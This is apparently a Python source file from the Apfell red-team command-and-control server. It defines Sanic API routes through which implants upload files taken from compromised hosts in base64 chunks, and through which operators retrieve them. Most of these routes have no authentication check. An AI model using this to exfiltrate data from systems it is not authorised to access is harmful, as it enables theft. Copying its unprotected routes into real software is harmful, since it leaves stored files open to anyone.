from app import apfell, db_objects
from app.database_models.model import FileMeta, Task
from sanic.response import json, raw
import base64
from sanic_jwt.decorators import protected, inject_user
import os


@apfell.route(apfell.config['API_BASE'] + "/files", methods=['GET'])
@inject_user()
@protected()
async def get_all_files_meta(request, user):
    try:
        files = await db_objects.execute(FileMeta.select())
    except Exception as e:
        return json({'status': 'error', 'error': 'failed to get files'})
    return json([f.to_json() for f in files])


@apfell.route(apfell.config['API_BASE'] + "/files/<id:int>", methods=['GET'])
async def get_one_file(request, id):
    try:
        file_meta = await db_objects.get(FileMeta, id=id)
    except Exception as e:
        print(e)
        return json({}, status=404)
    # now that we have the file metadata, get the file if it's done downloading
    if file_meta.complete:
        file = open(file_meta.path, 'rb').read()
        encoded = base64.b64encode(file)
        return raw(encoded)
    else:
        return json({'status': 'error', 'error': 'file not done downloading'})


#  when an implant gets the task to download a file, first reaches out here
@apfell.route(apfell.config['API_BASE'] + "/files/", methods=['POST'])
async def create_filemeta_in_database(request):
    return await create_filemeta_in_database_func(request.json)


async def create_filemeta_in_database_func(data):
    #  create a filemeta object where we will then start uploading our file
    #  expects total_chunks, and task
    if 'total_chunks' not in data:
        return json({'status': 'error', 'error': 'total_chunks required'})
    if 'task' not in data:
        return json({'status': 'error', 'error': 'corresponding task id required'})
    try:
        task = await db_objects.get(Task, id=data['task'])
        operation = task.callback.operation
    except Exception as e:
        print(e)
        return json({'status': 'error', 'error': "failed to find task"})
    try:
        filename = os.path.split(task.params)[1]
        save_path = os.path.abspath('./app/files/{}/downloads/{}/{}'.format(operation.name, task.callback.host, filename))
        count = 1
        tmp_path = save_path
        while os.path.exists(tmp_path):
            # the path already exists, so the file needs a new name
            tmp_path = save_path + str(count)
            count = count + 1
        save_path = tmp_path
        if not os.path.exists(os.path.split(save_path)[0]):
            os.makedirs(os.path.split(save_path)[0])
        filemeta = await db_objects.create(FileMeta, total_chunks=data['total_chunks'], task=task, operation=operation,
                                           path=save_path)
    except Exception as e:
        print(e)
        return json({'status': 'error', 'error': "failed to create file"})
    status = {'status': 'success'}
    return json({**status, **filemeta.to_json()})


# after calling the above path, the implant calls this to upload the content
@apfell.route(apfell.config['API_BASE'] + "/files/<id:int>", methods=['POST'])
async def download_file_to_disk(request, id):
    return await download_file_to_disk_func({**request.json, "file_id": id})


async def download_file_to_disk_func(data):
    #  upload content blobs to be associated with filemeta id
    if 'chunk_num' not in data:
        return json({'status': 'error', 'error': 'missing chunk_num'})
    if 'chunk_data' not in data:
        return json({'status': 'error', 'error': 'missing chunk data'})
    try:
        file_meta = await db_objects.get(FileMeta, id=data['file_id'])
    except Exception as e:
        print(e)
        return json({'status': 'error', 'error': 'failed to get File info'})
    try:
        chunk_data = base64.b64decode(data['chunk_data'])
        f = open(file_meta.path, 'ab')
        f.write(chunk_data)
        f.close()
        file_meta.chunks_received = file_meta.chunks_received + 1
        if file_meta.chunks_received == file_meta.total_chunks:
            file_meta.complete = True
        await db_objects.update(file_meta)
    except Exception as e:
        print(e)
        return json({'status': 'error', 'error': 'failed to store chunk'})
    return json({'status': 'success'})